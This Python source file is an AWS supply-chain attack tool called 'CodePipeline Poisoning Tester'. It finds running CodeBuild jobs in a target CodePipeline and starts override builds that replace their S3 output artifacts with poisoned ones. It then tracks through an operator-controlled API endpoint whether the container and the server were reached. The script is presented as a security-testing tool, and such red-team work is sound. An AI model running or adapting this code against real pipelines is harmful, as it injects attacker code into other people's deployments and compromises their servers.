import boto3
from botocore.config import Config
from botocore.exceptions import ClientError
import argparse
from time import sleep, time
from yaspin import kbi_safe_yaspin as yaspin
import base64
import requests
import json
import curses
import signal
import sys
import yaml
import os

# Global variables
line = 0
screen_line = None
stdscreen = None
spinner = yaspin()
logs = []

# Initial setup methods
def get_args():
    """Configures and evaluates the required command line parameters and flags. Returns the argparse object containing parameters and flags.

    Returns
    ----------
    args : argparse
        The argparse object containing command parameters and flags.
    """
    parser = argparse.ArgumentParser(description='Poison and monitor the selected CodePipeline pipeline for testing purposes.', formatter_class=argparse.ArgumentDefaultsHelpFormatter, argument_default=argparse.SUPPRESS)
    parser.add_argument('Pipeline Name', metavar='Pipeline_Name', type=str, help='The name of the pipeline to be poisoned')
    parser.add_argument('Access Key Id', metavar='Access_Key_Id', type=str, help='The AWS ACCESS KEY ID used to authenticate with AWS')
    parser.add_argument('Secret Access Key', metavar='Secret_Access_Key', type=str, help='The AWS SECRET ACCESS KEY used to authenticate with AWS')
    parser.add_argument('API URL', metavar='CPPT_API_URL', type=str, help='The URL of the API Gateway for CodePipeline Poisoning Tester (CPPT)')
    parser.add_argument('API Key', metavar='CPPT_API_Key', type=str, help='The API Key of the API Gateway for CodePipeline Poisoning Tester (CPPT)')

    parser.add_argument('-r', '--AWS-REGION', metavar='eu-west-1', type=str, nargs='?', default='eu-west-1', required=False, help='AWS region used to create the clients')
    parser.add_argument('-t', '--TIMEOUT-MONITOR', metavar='120', type=int, nargs='?', default=120, required=False, help='Timeout for monitoring task in seconds')
    parser.add_argument('-o', '--OUTPUT-FILE', metavar='file.logs', type=os.path.abspath, nargs='?', default='cpptOutput.logs', required=False, help='Ammount of executions to infect')
    parser.add_argument('-m', '--MAX-EXECUTIONS', metavar='1', type=int, nargs='?', default=1, required=False, help='Ammount of executions to infect')
    return parser.parse_args()

def get_aws_clients(aws_access_key_id, aws_secret_access_key, region_name = 'eu-west-1'):
    """Configures and initializes boto3 AWS clients for AWS CodePipeline and CodeBuild.

    Parameters
    ----------
    aws_access_key_id : str
        The AWS Access Key ID used to authenticate to AWS.
    aws_secret_access_key : str
        The AWS Secret Access Key used to authenticate to AWS.
    region_name : str (optional)
        AWS region used to create the clients. (Default: eu-west-1)

    Returns
    ------
    tuple : client_pipeline, client_codebuild
        Tuple of objects containing the boto3 clients for AWS CodePipeline and CodeBuild respectively.
    """
    my_config = Config(
        region_name = region_name,
        signature_version = 'v4',
        retries = {
            'max_attempts': 10,
            'mode': 'standard'
        }
    )
    client_codebuild = boto3.client('codebuild', config=my_config, aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key)
    client_pipeline = boto3.client('codepipeline', config=my_config, aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key)
    return client_pipeline, client_codebuild

# Terminal handling
def flush_terminal():
    """Flushes and terminates curses for a clean exit to the original terminal.
    """
    curses.flushinp()   
    curses.endwin()

def signal_handler(sig, frame):
    """Used as signal handler (See Signal handling in Python). Configures a signal handling and exits the execution in a clean manner.

    Parameters
    ----------
    sig : signal variable
        Signal type to be handled
    frame : frame
        Frame objects represent execution frames. They may occur in traceback objects (see below), and are also passed to registered trace functions.
    """
    flush_terminal()
    print_info('[i] Ctrl+C detected, stopping execution')
    sys.exit(0)

# Logging management
def process_logs(file):
    """Outputs in the output file and in terminal the information logged during the execution.

    Parameters
    ----------
    file : str
        Name of the file used to output the logs.
    """
    with open(file, 'w') as f:
        f.write('\n'.join(logs))
    print('\n'.join(logs))

def print_info(text):
    """Centralized function to print information via the spinner object from global variables and keep the logs updated.

    Parameters
    ----------
    text : str
        Text to be printed. Two special cases:
            if text is 'ok' -> Make the spinner show a tick
            if text is 'fail' -> Make spinner show a cross
    """
    global line, logs, stdscreen
    if stdscreen == None:
        stdscreen = curses.initscr()
        stdscreen.refresh()
    if text == 'ok':
        logs.append('[✓] {}'.format(spinner.text))
        spinner.ok('[✓]')
        line += 1
    elif text == 'fail':
        logs.append('[X] {}'.format(spinner.text))
        spinner.fail('[X]')
        line += 1
    else:
        max_characters_per_line = os.get_terminal_size()[0]
        if len(text) > max_characters_per_line:
            x = 0
            for y in range(max_characters_per_line, len(text)+max_characters_per_line, max_characters_per_line):
                logs.append(text[x:y])
                spinner.write(text[x:y])
                x = y
                line += 1
        else:
            logs.append(text)
            spinner.write(text)
            line += 1

def print_object_info(object: dict):
    """Centralized function to print information via the spinner object from global variables and keep the logs updated.

    Parameters
    ----------
    object : dict
        Object (dict) to be printed.
    """
    lines = json.dumps(object, indent=2).split('\n')
    for line in lines:
        print_info('  {0}'.format(line))

def print_table_info(type: str, values: dict = {}, restart = False, refresh = False):
    """Centralized function to print table information for monitoring poisoned artifact status.

    Parameters
    ----------
    type : str
        The type of line to be printed. Options are 'separator', 'header', 'content', 'pointer', and 'end'. 
    values : dict (optional)
        Values used to format the content of the line to be sent to the output. Required for line type 'content' with keys 'artifactId', 'container', and 'server'. (Default: {})
    restart : bool (optional)
        Determines whether a new table will be outputed and resets the screen_line counter. (Default: False)
    refresh : bool (optional)
        Determines whether a the window needs to be refreshed. (Default: False)

    Raises
    ------
    ValueError : 
            If the type or values parameters do not contain the supported or required keys.
    """
    global screen_line, logs, stdscreen
    if stdscreen == None:
        stdscreen = curses.initscr()
        stdscreen.refresh()
    if screen_line == None or restart:
        screen_line = line + 1
    options = {
        'separator': {
            'required': [],
            'text': '+' + '-'*71 + '+',
            'line': screen_line,
            'add': 1
        },
        'header': {
            'required': [],
            'text': '| Artifact ID\t\t| Container poisoned\t| Server poisoned\t|',
            'line': screen_line,
            'add': 1
        },
        'content': {
            'required': ['artifactId', 'container', 'server'],
            'text': '| {artifactId}\t\t| {container}\t\t\t| {server}\t\t\t|',
            'line': screen_line,
            'add': 1
        },
        'pointer': {
            'required': [],
            'text': '',
            'line': line,
            'add': 0
        },
        'end': {
            'required': [],
            'text': '',
            'line': line,
            'add': 0
        }
    }
    if type not in options:
        raise ValueError('Wrong type of info: {0}. Valid types: {1}'.format(type, options.keys()))
    elif all([r in values.keys() for r in options[type]['required']]):
        stdscreen.addstr(options[type]['line'], 0, options[type]['text'].format(**values))
        screen_line += options[type]['add']
        if refresh:
            stdscreen.refresh()
    else:
        raise ValueError('Wrong values: {0}. Valid values: {1}'.format(values.keys(), options[type]['required']))

# Object structure
def get_artifact_override(location:str, path:str, name:str):
    """Creates a valid artifact override object for StartBuild action based on the given parameters.

    Parameters
    ----------
    location : str
        Location of the output artifact (S3 bucket name).
    path : str
        Path of the output artifact (S3 folders).
    name : str
        Name of the output artifact (S3 object name).

    Returns
    ----------
    artifact_override: dict
        A valid artifact override object for StartBuild action.
    """
    return {
        'type': 'S3',
        'location': location,
        'path': path,
        'namespaceType': 'NONE',
        'name': name,
        'packaging': 'ZIP',
        'overrideArtifactName': True,
        'encryptionDisabled': False,
        'artifactIdentifier': ''
    }

def get_artifact_info(pipeline_execution):
    """Strips the location, path, and name parameters from the given pipeline execution object returned by AWS CodePipeline

    Parameters
    ----------
    pipeline_execution : dict
        AWS CodePipeline or CodeBuild object containing information regarding build execution.
    
    Returns
    ----------
    location : str
        Location of the output artifact (S3 bucket name).
    path : str
        Path of the output artifact (S3 folders).
    name : str
        Name of the output artifact (S3 object name).
    """
    if 's3location' in pipeline_execution['buildArtifact'][0].keys():
        location = pipeline_execution['buildArtifact'][0]['s3location']['bucket']
        path = '/'.join(pipeline_execution['buildArtifact'][0]['s3location']['key'].split('/')[0:2])
        name = pipeline_execution['buildArtifact'][0]['s3location']['key'].split('/')[-1]
    elif 'location' in pipeline_execution['buildArtifact'][0].keys():
        location = pipeline_execution['buildArtifact'][0]['location'].split(':')[-1].split('/')[0]
        path = '/'.join(pipeline_execution['buildArtifact'][0]['location'].split(':')[-1].split('/')[1:3])
        name = pipeline_execution['buildArtifact'][0]['location'].split(':')[-1].split('/')[-1]
    else :
        raise ValueError('Provided build execution objects do not contain "s3location" nor "location"')
    return location, path, name

def get_poisoned_artifact(build, artifactId, pipelineExecutionId):
    """Creates a dictionary tailored to the CodePipeline Poisoning Tester with the information provided of the poisoned build.

    Parameters
    ----------
    build : dict
        AWS CodeBuild object containing information regarding one build execution.
    artifactId : str
        AWS Artifact name.
    pipelineExecutionId : str
        AWS CodePipeline execution ID.
    
    Returns
    ----------
    poisoned_artifact : dict
        Dictionary tailored to the CodePipeline Poisoning Tester with the information provided of the poisoned build.
    """
    return {
        'artifactId': artifactId,
        'buildNumber': build['build']['buildNumber'],
        'buildId':  build['build']['id'],
        'pipelineExecutionId': pipelineExecutionId
    }

# Poison Pipeline core
def search_artifacts_via_CodePipeline(client_pipeline, pipelineName, max_executions, sleep_seconds=5):
    """Queries AWS CodePipeline in order to search for ongoing pipeline executions and their artifacts.

    Parameters
    ----------
    client_pipeline : boto3.client
        AWS CodePipeline client object.
    pipelineName : str
        AWS CodePipeline name to target.
    max_executions : int
        Number of different executions to search for artifacts.
    sleep_seconds : int (optional)
        Number of seconds to sleep between query requests. (Default: 5)
    
    Returns
    ----------
    pipeline_executions : list
        List of dictionaries containing information of the pipeline execution with keys ['pipelineName', 'pipelineExecutionId', 'buildArtifact', 'projectName'].
    """
    pipeline_executions = []
    allowed = True
    base_text = 'Searching for artifacts ({0}/{1})'
    spinner.text = base_text.format(len(pipeline_executions), max_executions)
    while len(pipeline_executions) < max_executions and allowed:
        try:
            executions = client_pipeline.list_action_executions(pipelineName=pipelineName)['actionExecutionDetails']
            for execution in executions:
                if execution['pipelineExecutionId'] not in [x['pipelineExecutionId'] for x in pipeline_executions]:
                    if execution['input']['actionTypeId']['provider'] == 'CodeBuild':
                        in_progress = [True for e in executions if e['pipelineExecutionId'] == execution['pipelineExecutionId'] and e['status'] == 'InProgress']
                        if any(in_progress):
                            if 'output' in execution and 'outputArtifacts' in execution['output']:
                                if len(execution['output']['outputArtifacts']) > 0:
                                    pipeline_executions.append({
                                        'pipelineName': pipelineName,
                                        'pipelineExecutionId': execution['pipelineExecutionId'],
                                        'buildArtifact': execution['output']['outputArtifacts'],
                                        'projectName': execution['input']['configuration']['ProjectName']
                                    })
                                    print_info('[+] Artifact found:')
                                    print_object_info(pipeline_executions[-1])
                                    if len(pipeline_executions[-1]['buildArtifact']) > 1:
                                        print_info('  [+] With secondary artifacts:')
                                        for secondary_artifact in pipeline_executions[-1]['buildArtifact'][1:]:
                                            print_object_info(secondary_artifact)
                                    spinner.text = base_text.format(len(pipeline_executions), max_executions)
            if len(pipeline_executions) < max_executions:
                sleep(sleep_seconds)
        except ClientError as exception:
            if exception.response['Error']['Code'] == 'AccessDeniedException':
                print_info('[-] CodePipeline List Action Executions access denied.')
                return [], False
            else:
                print_info('fail')
                print_info('[!] An error has occured while trying to list the action executions:')
                raise exception
    return pipeline_executions, allowed

def list_builds_via_CodeBuild(client_codebuild):
    """Queries AWS CodeBuild in order to search for build execution ids.

    Parameters
    ----------
    client_codebuild : boto3.client
        AWS CodeBuild client object.
    
    Returns
    ----------
    ids : list
        List of CodeBuild build execution ids.
    """
    ids = []
    extra_params = {}
    while True:
        try: 
            builds = client_codebuild.list_builds(**extra_params)
            ids.extend(builds['ids'])
            if 'nextToken' not in builds.keys():
                break
            else:
                extra_params['nextToken'] = builds['nextToken']
        except ClientError as exception:
            if exception.response['Error']['Code'] == 'AccessDeniedException':
                print_info('[-] CodeBuild List Builds access denied.')
                return [], False
            else:
                print_info('fail')
                print_info('[!] An error has occured while trying to list the builds:')
                raise exception
    return ids, True

def batch_get_builds_via_CodeBuild(client_codebuild, ids):
    """Queries AWS CodeBuild in order to search for build execution information for the provided ids.

    Parameters
    ----------
    client_codebuild : boto3.client
        AWS CodeBuild client object.
    ids : list
        List of CodeBuild build execution ids.
    
    Returns
    ----------
    builds_info : list
        List of build executions with information.
    """
    builds_info = []
    x = 0
    for y in range(100, len(ids)+100, 100):
        try:
            builds_info.extend(client_codebuild.batch_get_builds(ids=ids[x:y])['builds'])
            x = y
        except ClientError as exception:
            if exception.response['Error']['Code'] == 'AccessDeniedException':
                print_info('[-] CodeBuild Batch Get Builds access denied.')
                return [], False
            else:
                print_info('fail')
                print_info('[!] An error has occured while trying to get the batch builds:')
                raise exception
    return builds_info, True

def search_artifacts_via_CodeBuild(client_codebuild, pipelineName, max_executions, sleep_seconds=5):
    """Queries AWS CodeBuild in order to search for build executions that belong to a pipeline and their artifacts.

    Parameters
    ----------
    client_codebuild : boto3.client
        AWS CodeBuild client object.
    pipelineName : str
        AWS CodePipeline name to target.
    max_executions : int
        Number of different executions to search for artifacts.
    sleep_seconds : int (optional)
        Number of seconds to sleep between query requests. (Default: 5)
    
    Returns
    ----------
    pipeline_executions : list
        List of dictionaries containing information of the pipeline execution with keys ['pipelineName', 'pipelineExecutionId', 'buildArtifact', 'projectName'].
    """
    ids = []
    builds_info = []
    pipeline_executions = []
    allowed = True
    base_text = 'Searching for artifacts ({0}/{1})'
    spinner.text = base_text.format(len(pipeline_executions), max_executions)
    while len(pipeline_executions) < max_executions and allowed:
        ids, allowed = list_builds_via_CodeBuild(client_codebuild)
        if len(ids) > 0:
            builds_info, allowed = batch_get_builds_via_CodeBuild(client_codebuild, ids)
        if len(builds_info) > 0:
            valid_phases = ['DOWNLOAD_SOURCE', 'INSTALL', 'PRE_BUILD', 'BUILD', 'POST_BUILD', 'UPLOAD_ARTIFACTS', 'FINALIZING']
            for build in builds_info:
                if build['id'] not in [x['buildExecutionId'] for x in pipeline_executions]:
                    if build['initiator'] == 'codepipeline/'+pipelineName:
                        if build['currentPhase'] in valid_phases:
                            artifacts = []
                            artifacts.append(build['artifacts'])
                            artifacts.extend(build['secondaryArtifacts'])
                            pipeline_executions.append({
                                'pipelineName': pipelineName,
                                'buildExecutionId': build['id'],
                                'pipelineExecutionId': 'Unknown by CodeBuild',
                                'buildArtifact': artifacts,
                                'projectName': build['projectName']
                            })
                            print_info('[+] Artifact found:')
                            print_object_info(pipeline_executions[-1])
                            if len(pipeline_executions[-1]['buildArtifact']) > 1:
                                print_info('  [+] With secondary artifacts:')
                                for secondary_artifact in pipeline_executions[-1]['buildArtifact'][1:]:
                                    print_object_info(secondary_artifact)
                            spinner.text = base_text.format(len(pipeline_executions), max_executions)
            if len(pipeline_executions) < max_executions:
                sleep(sleep_seconds)
    return pipeline_executions, allowed

def search_artifacts(client_codebuild, client_pipeline, pipelineName, max_executions, sleep_seconds=5):
    """Queries AWS CodeBuild and CodePipeline in order to search for ongoing build executions and their artifacts.

    Parameters
    ----------
    client_codebuild : boto3.client
        AWS CodeBuild client object.
    client_pipeline : boto3.client
        AWS CodePipeline client object.
    pipelineName : str
        AWS CodePipeline name to target.
    max_executions : int
        Number of different executions to search for artifacts.
    sleep_seconds : int (optional)
        Number of seconds to sleep between query requests. (Default: 5)
    
    Returns
    ----------
    pipeline_executions : list
        List of dictionaries containing information of the pipeline execution with keys ['pipelineName', 'pipelineExecutionId', 'buildArtifact', 'projectName'].
    """
    pipelineExecutions, allowed = search_artifacts_via_CodeBuild(client_codebuild, pipelineName, max_executions, sleep_seconds)
    if not allowed:
        pipelineExecutions, allowed = search_artifacts_via_CodePipeline(client_pipeline, pipelineName, max_executions, sleep_seconds)
    if allowed:
        print_info('ok')
    else:
        print_info('fail')
    return pipelineExecutions

def start_poisoned_build(client_codebuild, pipeline_executions, url, api_key):
    """Configures and initializes poisoned builds via AWS CodeBuild StartBuild. The poisoned build follow the configuration set in "utils.yaml" file.

    Parameters
    ----------
    client_codebuild : boto3.client
        AWS CodeBuild client object.
    pipeline_executions : list
        List of dictionary containing information of the pipeline execution. (See search_artifact())
    url : str
        URL to be used by the poisoned script to contact and keep track of the poisoning process.
    api_key : str
        API Key used to authenticate against the API Gateway behind the url provided as parameter.
    
    Returns
    ----------
    poisoned_artifacts : list
        List of dictionaries containing information of the poisoned build. (See get_poisoned_artifact())
    """
    poisoned_artifacts = []
    base_text = 'Poisoning artifacts ({0}/{1})'
    spinner.text = base_text.format(len(poisoned_artifacts), len(pipeline_executions))
    utils = {}
    try:
        with open('utils.yaml', 'r') as file:
            utils = yaml.safe_load(file)
    except Exception as exception:
        print_info('fail')
        print_info('[!] An error has occurred while loading utils.yaml:')
        raise exception
    executed_script =  utils['script']
    poisoned_appspec = utils['appspec']
    buildspec_override = utils['buildspec']
    for pipeline_execution in pipeline_executions:
        location, path, name = get_artifact_info(pipeline_execution)
        artifact_override = get_artifact_override(location, path, name)
        formatted_executed_script = executed_script.format(name, url, api_key)
        base64_encoded_script = str(base64.b64encode(formatted_executed_script.encode("utf-8")), "utf-8")
        base64_encoded_appspec = str(base64.b64encode(poisoned_appspec.encode("utf-8")), "utf-8")
        formatted_buildspec_override = buildspec_override.format(name, url, base64_encoded_appspec, base64_encoded_script, api_key)
        try:
            response = client_codebuild.start_build(projectName=pipeline_execution['projectName'], artifactsOverride=artifact_override, buildspecOverride=formatted_buildspec_override)
        except ClientError as exception:
            print_info('fail')
            print_info('[!] An error has occurred while starting a build:')
            raise exception
        if response:
            poisoned_artifacts.append(get_poisoned_artifact(response, name, pipeline_execution['pipelineExecutionId']))
            print_info('[+] Poisoned build started:')
            print_object_info(poisoned_artifacts[-1])
            spinner.text = base_text.format(len(poisoned_artifacts), len(pipeline_executions))
    print_info('ok')
    return poisoned_artifacts

def update_poison_pipeline_api(poisoned_artifacts, url, api_key):
    """Updates and initializes the posioned build information in the CodePipeline Poisoning Tester API Gateway (also used for monitoring purposes).

    Parameters
    ----------
    poisoned_artifacts : list
        List of dictionaries containing information of the poisoned build. (See get_poisoned_artifact())
    url : str
        URL to be used by the poisoned script to contact and keep track of the poisoning process.
    api_key : str
        API Key used to authenticate against the API Gateway behind the url provided as parameter.
    
    Returns
    ----------
    api_updated_artifacts : list
        List of dictionaries containing information of the poisoned build that were correctly updated in the CodePipeline Poisoning Tester API Gateway. (See get_poisoned_artifact())
    """
    base_text = 'Updating CPPT API  ({0}/{1})'
    api_updated_artifacts = []
    spinner.text = base_text.format(len(api_updated_artifacts), len(poisoned_artifacts))
    for artifact in poisoned_artifacts:
        artifact['action'] = 'add'
        artifact['key'] = api_key
        response = requests.post(url, json=artifact)
        if response.status_code == 200:
            api_updated_artifacts.append(artifact)
            print_info('[+] CPPT API updated with poisoned artifact: {0}'.format(artifact['artifactId']))
            spinner.text = base_text.format(len(api_updated_artifacts), len(poisoned_artifacts))
        else:
            print_info('[!] CPPT API update went wrong with poisoned artifact: {0} and error {1}'.format(artifact['artifactId'], response.text))
    print_info('ok')
    return api_updated_artifacts

def monitor_poisoned_artifacts(poisoned_artifacts, url, api_key, timeout, sleep_seconds=5):
    """Monitores and visualizes the posioned build information in the CodePipeline Poisoning Tester.

    Parameters
    ----------
    poisoned_artifacts : list
        List of dictionaries containing information of the poisoned build. (See get_poisoned_artifact())
    url : str
        URL to be used by the poisoned script to contact and keep track of the poisoning process.
    api_key : str
        API Key used to authenticate against the API Gateway behind the url provided as parameter.
    timeout : int
        Timeout time used to terminate the monitoring even if all poisoned builds did not succeed.
    sleep_seconds : int (optional)
        Number of seconds to sleep between query requests. (Default: 5)
    """
    base_text = 'Monitoring poisoned artifacts (time before timeout: {0}s)'
    spinner.text = base_text.format(str(timeout))
    ready = False
    start_time = time()
    while not ready and (time()-start_time) < timeout:
        print_table_info('separator', restart=True)
        print_table_info('header')
        print_table_info('separator')
        ready = True
        for artifact in poisoned_artifacts:
            data = {
                'action': 'read',
                'artifactId': artifact['artifactId'],
                'key': api_key
            }
            response = requests.post(url, json=data)
            item = None
            if response.status_code == 200 and response.content:
                item = json.loads(response.content)['Item']
                item['artifactId'] = artifact['artifactId']
                if not item['container'] or not item['server']:
                    ready = False
            else:
                item = {
                    'artifactId': artifact['artifactId'],
                    'container': 'unknown',
                    'server': 'unknown'
                }
                ready = False
            print_table_info('content', item)
            print_table_info('separator')
        spinner.stop()
        if not ready:
            print_table_info('pointer', refresh=True)
            spinner.text = base_text.format(str(timeout-int(time()-start_time)))
            spinner.start()
            sleep(sleep_seconds)
    if not ready:
        print_info('[i] The timeout time was reached (timeout = {}s)'.format(timeout))
    else:
        print_info('[i] All poisoned artifacts were successfull')
    if stdscreen is not None:
        for l in range(line, screen_line):
            logs.append(stdscreen.instr(l,0).decode('utf-8').strip())
    print_info('ok')

# Main
def main():
    """Main method when using the CodePipeline Poisoning Tester from terminal. Manages and performs the CodePipeline Poisoning Tester execution.
    """
    global stdscreen
    args = vars(get_args())
    client_pipeline, client_codebuild = get_aws_clients(args['Access Key Id'], args['Secret Access Key'], args['AWS_REGION'])
    signal.signal(signal.SIGINT, signal_handler)
    if stdscreen == None:
        stdscreen = curses.initscr()
        stdscreen.refresh()
    spinner.start()
    try:
        pipeline_executions = search_artifacts(client_codebuild, client_pipeline, args['Pipeline Name'], args['MAX_EXECUTIONS'])
        poisoned_artifacts = start_poisoned_build(client_codebuild, pipeline_executions, args['API URL'], args['API Key'])
        api_updated_artifacts = update_poison_pipeline_api(poisoned_artifacts, args['API URL'], args['API Key'])
        monitor_poisoned_artifacts(api_updated_artifacts, args['API URL'], args['API Key'], args['TIMEOUT_MONITOR'])
    except ClientError as exception:
        print_info('  [i] {0}'.format(exception))
    except Exception as exception:
        print_info('[!] An error ocurred:')
        print_info('  [i] {0}'.format(exception))
    finally:
        spinner.stop()
        flush_terminal()
        process_logs(args['OUTPUT_FILE'])

if __name__ == '__main__':
    main()
